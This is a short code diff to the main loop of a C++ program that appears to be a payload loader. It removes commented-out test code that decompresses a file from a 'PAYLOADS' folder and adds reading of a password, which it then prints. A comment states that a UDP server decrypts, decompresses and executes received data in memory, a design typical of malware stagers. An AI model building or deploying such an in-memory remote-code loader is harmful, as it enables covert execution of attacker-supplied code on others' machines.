@@ -32,52 +32,18 @@ int main()
 {
 	while (1)
 	{
-		//ToDo - temporary decompression testing
-		//Since we don't have network/decryption fully implemented - pull the poetry.zips testfile here and read it into a buffer, then pass that buffer to rewritted uziphelp.
-		//Decompression Testing - THIS WORKS.  VERIFIED.
-		/*
-		const char* compression_iput = "..\\PAYLOADS\\poetry.zips";
-		const char* compression_outp = "..\\poetry.txt";
-		long file_loc;
-		unsigned char infile_size;
-
-		char* inBuf = new char[1024]; //udp client is a char* buffer
-		char* opBuf = new char[1024];
-
-		FILE* File;
-		char* Buffer;
-		unsigned long Size;
-
-
-		fopen_s(&File, "..\\PAYLOADS\\poetry.txt", "rb");
-		if (!File)
-		{
-			printf("Error while reading the file\n");
-			getchar();
-			return 0;
-		}
-
-		fseek(File, 0, SEEK_END);
-		Size = ftell(File);
-		fseek(File, 0, SEEK_SET);
-
-		Buffer = new char[Size];
-
-		fread(Buffer, 1, Size, File);
-
-		inBuf = Buffer;
-
-		printf("Encrypted buffer: %s\n", Buffer);
-		uziphelp(inBuf, opBuf);
-		printf("\nDecrypted buffer: %s \n", opBuf);
-		*/
+		//read config
 		ConfigFile cfg("loader.conf");
 		std::string portstring = get_config_item(cfg, "port");
 		int port = std::stoi(portstring.c_str());
-		printf("-Configurations-\nPort: %d\n", port);
+		std::string password = get_config_item(cfg, "password");
+
+		printf("-Configurations-\n");
+		printf("Port: %d\n", port);
+		printf("Password: %s\n", password.c_str());
 
 		//decryption, decompression, and execution in memory happens in here so we dont have to worry about allocating unknown buffer sizes.
-		udp_server_clinet(port);
+		udp_server_clinet(port, password);
 	}
 
 	return 0;
